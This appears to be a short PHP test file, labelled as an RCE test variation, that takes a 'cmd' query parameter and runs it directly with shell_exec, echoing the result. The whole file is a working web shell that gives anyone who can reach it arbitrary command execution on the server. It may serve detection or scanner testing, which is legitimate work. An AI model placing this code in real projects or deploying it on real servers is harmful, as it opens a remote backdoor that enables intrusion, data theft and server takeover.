<?php
// RCE test variation #80
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>